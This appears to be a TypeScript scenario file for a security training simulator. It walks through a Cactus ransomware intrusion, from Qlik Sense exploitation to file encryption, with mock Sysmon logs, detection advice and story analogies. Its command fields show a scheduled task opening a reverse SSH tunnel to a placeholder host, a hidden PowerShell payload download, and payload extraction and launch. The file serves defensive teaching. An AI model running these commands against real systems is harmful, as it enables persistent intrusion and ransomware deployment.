import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'cactus-ransomware-qlik-sense-ssh-batch-unpacker',
    title: 'Kroll, Arctic Wolf & CISA KEV — Cactus Ransomware: Qlik Sense Exploitation (CVE-2023-41265), Chisel SSH Tunneling & AES Batch-Driven Self-Decryption (.cts1)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in Kroll, Arctic Wolf, and Trend Micro incident response investigations into Cactus ransomware: operators exploit Qlik Sense (CVE-2023-41265 / CVE-2023-41266) or Fortinet VPN appliances, establish persistent SSH backdoors via Scheduled Tasks, and deploy a unique self-decrypting binary that cannot execute unless a batch script passes the `-i <32_byte_hex_AES_key>` switch to decrypt `ntuser.dat` in memory (`-r` runtime flag, `.cts1`).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Cactus Operator (Chisel + OpenSSH C2)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Qlik Sense Server (scheduler.exe RCE)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Batch Unpacker (7z.exe + -i AES Key)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Kroll / Arctic Wolf DFIR & Sysmon Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Encrypted Enterprise Shares (.cts1 / cAcTuS.readme.txt)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Qlik Sense Tunneling RCE (CVE-2023-41265) & Persistent OpenSSH Scheduled Task',
        narration:
          'Cactus operators exploit HTTP request tunneling and path traversal in Qlik Sense Enterprise (`CVE-2023-41265` and `CVE-2023-41266`), causing `scheduler.exe` to spawn `cmd.exe` and `powershell.exe`. They immediately register a Scheduled Task that runs a persistent reverse SSH connection (`sshd.exe` / `ssh.exe -R`) back to their C2 server.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access & Persistence (T1190 / T1053.005 / T1572)',
        technicalCommands: [
          'C:\\Program Files\\Qlik\\Sense\\Scheduler\\scheduler.exe -> cmd.exe /c powershell.exe -enc ...',
          'schtasks.exe /create /tn "Updates" /tr "C:\\ProgramData\\ssh.exe -N -R 2222:127.0.0.1:3389 user@198.51.100.42" /sc minute /mo 5 /ru SYSTEM',
        ],
        defenseMitigation:
          'Patch Qlik Sense against CVE-2023-41265/41266/46507 and alert immediately if `Qlik\\Sense\\Scheduler\\scheduler.exe` spawns `cmd.exe`, `powershell.exe`, or `curl.exe`.',
        logs: [
          {
            id: 'cactus-1',
            timestamp: '08:15:04.221',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -nop -w hidden -c "Invoke-WebRequest http://198.51.100.42/7z.msi -OutFile C:\\ProgramData\\7z.msi"',
            raw: 'EventID: 1 | ParentImage: C:\\Program Files\\Qlik\\Sense\\Scheduler\\scheduler.exe | Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Exploit: CVE-2023-41265 / CVE-2023-41266',
            parsedFields: {
              ExploitedService: 'Qlik Sense Scheduler (scheduler.exe)',
              VulnerabilityIds: 'CVE-2023-41265 & CVE-2023-41266',
              PersistenceTask: 'Scheduled Task "Updates" running reverse SSH tunnel',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: PsExec Batch Staging, `7z.exe` Extraction & `-i` AES Key Self-Decryption (`ntuser.dat`)',
        narration:
          'Using a custom PowerShell sprayer (`s.ps1`) and `psexec.exe`, the operator drops a password-protected 7-Zip archive onto target hosts, extracts it with `7z.exe`, deletes the archive, and launches the Cactus binary with `-i <64_hex_AES_key>`. The binary reads the encrypted payload from `C:\\ProgramData\\ntuser.dat`, decrypts it in memory using the `-i` AES-256 key, and re-launches itself with the `-r` runtime flag.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Execution Guardrails (T1140 - Deobfuscate/Decode Files / T1480)',
        technicalCommands: [
          'C:\\ProgramData\\7z.exe x C:\\ProgramData\\pack.7z -p"Cactus2026!" -oC:\\ProgramData\\ -y',
          'C:\\ProgramData\\cactus.exe -i 4A9F2C8E1D7B0A3F5E6C8B1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F (Decrypts ntuser.dat -> spawns cactus.exe -r)',
        ],
        defenseMitigation:
          'Hunt for binaries launched with `-i <64-hex-chars>` followed by child process creation of the same binary with `-r` or `-f` flags, and monitor `C:\\ProgramData\\ntuser.dat` creation.',
        logs: [
          {
            id: 'cactus-2',
            timestamp: '08:21:38.609',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'cactus.exe',
            CommandLine: 'C:\\ProgramData\\cactus.exe -i 4A9F2C8E1D7B0A3F5E6C8B1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\cactus.exe | CommandLine: cactus.exe -i <32-byte-AES-key> | EncryptedDatFile: C:\\ProgramData\\ntuser.dat | ReLaunchFlag: cactus.exe -r',
            parsedFields: {
              AntiAnalysisMechanism: 'Requires -i 32-byte hex AES key to decrypt C:\\ProgramData\\ntuser.dat',
              ExecutionStages: '-s (setup) -> -i (decrypt ntuser.dat) -> -r (runtime encryption)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Multi-Stream Micro-Read Encryption (`.cts0` -> `.cts1`) & `cAcTuS.readme.txt`',
        narration:
          'Running under the `-r` flag, Cactus renames target files to `.cts0` while actively encrypting them in small micro-streams (preventing file-lock race conditions) and renames them to `.cts1` upon completion while dropping `cAcTuS.readme.txt`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'C:\\ProgramData\\cactus.exe -r (Renames file -> *.cts0 during AES/RSA encryption -> *.cts1 on completion)',
          'WriteFile("cAcTuS.readme.txt") across all local and network directories',
        ],
        defenseMitigation:
          'Configure EDR ransomware canary traps to trigger on `.cts0` / `.cts1` file extensions and `cAcTuS.readme.txt` creation.',
        logs: [
          {
            id: 'cactus-3',
            timestamp: '08:25:12.440',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'cactus.exe',
            raw: 'EventID: 11 | Image: C:\\ProgramData\\cactus.exe | CommandLine: cactus.exe -r | TargetFilename: D:\\Shares\\cAcTuS.readme.txt | ExtensionProgression: .cts0 (in-flight) -> .cts1 (encrypted)',
            parsedFields: {
              RansomwareFamily: 'Cactus Ransomware',
              TwoPhaseExtension: '.cts0 (active stream) -> .cts1 (completed)',
              RansomNote: 'cAcTuS.readme.txt',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a stealthy burglar who sneaks through a warped side tunnel inside an analytics server and bolts a permanent hidden skylight onto the building schedule so they can return anytime. Rather than carrying an exposed lockpicker that guards immediately recognize, the burglar drops a password-locked suitcase onto every desk, unpacks a scrambled inner box using a secret key at runtime, and marks each file twice (first with an in-progress tag while taking tiny sips of data, then with a finished lock tag once sealed).',
      storyMappings: [
        {
          storyTerm: 'Warped side tunnel and permanent hidden skylight on the schedule',
          technicalTerm: 'Qlik Sense CVE-2023-41265 tunneling RCE and persistent OpenSSH scheduled task',
          tone: 'amber',
        },
        {
          storyTerm: 'Password-locked suitcase unpacking a scrambled inner box at runtime',
          technicalTerm: '7z.exe archive extraction and self-decrypting Cactus binary via -i AES key',
          tone: 'sky',
        },
        {
          storyTerm: 'Marking each file in-progress then finished while taking tiny sips',
          technicalTerm: 'Multi-stream micro-read encryption renaming files from .cts0 to .cts1',
          tone: 'rose',
        },
        {
          storyTerm: 'Extortion letter dropped across sealed rooms',
          technicalTerm: 'cAcTuS.readme.txt ransom note generated after completion',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Exploiting a bent routing tunnel inside a public analytics portal, the burglar slips straight into the back office and wires a repeating scheduled task that keeps a private encrypted back door propped open outward toward their own server.',
        storyMappings: [
          {
            storyTerm: 'Bent routing tunnel inside an analytics portal',
            technicalTerm: 'Qlik Sense Enterprise HTTP request tunneling and path traversal (CVE-2023-41265)',
            tone: 'amber',
          },
          {
            storyTerm: 'Repeating scheduled task holding a skylight open',
            technicalTerm: 'Scheduled task maintaining a persistent reverse OpenSSH tunnel',
            tone: 'sky',
          },
          {
            storyTerm: 'Bypassing inbound perimeter doors',
            technicalTerm: 'Outbound SSH reverse tunnel surviving perimeter IP blocks',
            tone: 'rose',
          },
          {
            storyTerm: 'Staging ground for enterprise spread',
            technicalTerm: 'Compromised analytics server used to pivot into Active Directory',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'To fool hallway security inspectors who X-ray every file sitting on disk, the crew sprays a locked archive across every workstation, unzips it with a batch script, and passes an unlocking key directly on the command line so the padlocking machine only unscrambles itself inside live working memory.',
        storyMappings: [
          {
            storyTerm: 'Spraying a locked archive across every workstation',
            technicalTerm: 'PowerShell sprayer (s.ps1) and PsExec distributing a password-protected 7-Zip archive',
            tone: 'amber',
          },
          {
            storyTerm: 'Unzipping with a batch helper script',
            technicalTerm: '7z.exe extracting the encrypted Cactus payload (ntuser.dat) on target hosts',
            tone: 'sky',
          },
          {
            storyTerm: 'Unlocking key passed on the command line',
            technicalTerm: 'Mandatory -i flag supplying the AES key for runtime self-decryption',
            tone: 'rose',
          },
          {
            storyTerm: 'Defeating static X-ray inspection on disk',
            technicalTerm: 'Encrypted on-disk payload remaining unreadable to static AV signatures until -i runs',
            tone: 'emerald',
          },
        ],
      },
      3: {
        storyAnalogy:
          'Running in quiet multi-stream mode, the unscrambled encryptor takes small sips of each file so heavy disk-thrashing alarms stay calm, tagging active files with a temporary work badge before flipping them to a final sealed tag and leaving its signature cactus ransom card.',
        storyMappings: [
          {
            storyTerm: 'Taking small sips so disk-thrashing alarms stay calm',
            technicalTerm: 'Multi-stream micro-read encryption under the -r flag evading I/O spike heuristics',
            tone: 'amber',
          },
          {
            storyTerm: 'Temporary work badge during active locking',
            technicalTerm: 'Target files temporarily renamed to .cts0 while encryption is underway',
            tone: 'sky',
          },
          {
            storyTerm: 'Final sealed tag upon completion',
            technicalTerm: 'Completed encrypted files renamed from .cts0 to .cts1',
            tone: 'rose',
          },
          {
            storyTerm: 'Signature cactus ransom card',
            technicalTerm: 'Dropped cAcTuS.readme.txt extortion demand file',
            tone: 'emerald',
          },
        ],
      },
    },
  };
